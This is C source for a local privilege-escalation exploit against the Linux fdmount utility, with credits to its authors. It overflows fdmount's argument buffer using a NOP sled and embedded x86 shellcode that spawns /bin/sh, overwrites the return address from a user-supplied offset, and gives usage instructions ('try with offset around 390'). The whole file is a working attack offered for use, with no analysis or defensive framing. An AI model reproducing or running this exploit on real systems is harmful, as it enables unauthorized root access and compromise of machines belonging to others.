
/* fdmount exploit
 *
 * by [WaR] <war@genhex.org> and Zav <zav@genhex.org>
 *
 * usage: ./fdmountx <offset>
 *   try with offset around 390 (you'll only get one try) 
 *
 *  Shout outs to all of the GenHex crew, and to 
 *            the #newbreed at irc.ptnet.org.
 */

#include <stdio.h>
#include <stdlib.h>

#define BUFFSIZE 70

char shell[] = /* by Zav */
   "\xeb\x33\x5e\x89\x76\x08\x31\xc0"
   "\x88\x66\x07\x83\xee\x02\x31\xdb"
   "\x89\x5e\x0e\x83\xc6\x02\xb0\x1b"
   "\x24\x0f\x8d\x5e\x08\x89\xd9\x83"
   "\xee\x02\x8d\x5e\x0e\x89\xda\x83"
   "\xc6\x02\x89\xf3\xcd\x80\x31\xdb"
   "\x89\xd8\x40\xcd\x80\xe8\xc8\xff"
   "\xff\xff/bin/sh";


main(int argc, char **argv)
{
  int i,j;
  char buffer[BUFFSIZE+6]; 
  unsigned long eip=(unsigned long)&eip;
  unsigned long *ptr;


  if(argc>1)
   eip+=atoi(argv[1]);

  memset(buffer,0x90,75);
  memcpy(buffer+(BUFFSIZE-strlen(shell)),shell,strlen(shell));

 ptr=(unsigned long*)(buffer+71);
 *ptr=eip;

 buffer[75]=0;
 buffer[0]='/';

 execl("/usr/bin/fdmount","fdmount","fd0",buffer,NULL);
}

